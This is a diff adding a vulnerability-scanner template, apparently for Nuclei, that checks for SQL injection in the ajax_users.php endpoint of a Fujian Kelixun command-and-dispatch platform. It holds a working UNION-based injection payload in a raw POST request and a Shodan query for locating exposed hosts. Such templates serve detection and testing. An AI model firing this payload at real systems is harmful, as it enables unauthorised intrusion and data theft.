@@ -1,0 +1,31 @@
+id: Command_and_dispatch_management_platform_ajax_users_SQLi
+
+info:
+  name: Command_and_dispatch_management_platform_ajax_users_SQLi
+  author: HK
+  severity: high
+  description: 福建科立讯通信 指挥调度管理平台ajax_users.php 存在SQL注入
+  metadata:
+    max-request: 1
+    shodan-query: body="app/structure/departments.php"
+    verified: true
+
+http:
+- raw:
+  - |-
+    @timeout: 30s
+    POST /app/ext/ajax_users.php HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 info
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 84
+
+    dep_level=1') UNION ALL SELECT NULL,CONCAT(0x7e,md5(123456),0x7e),NULL,NULL,NULL-- -
+
+  redirects: true
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+        - e10adc3949ba59abbe56e057f20f883e
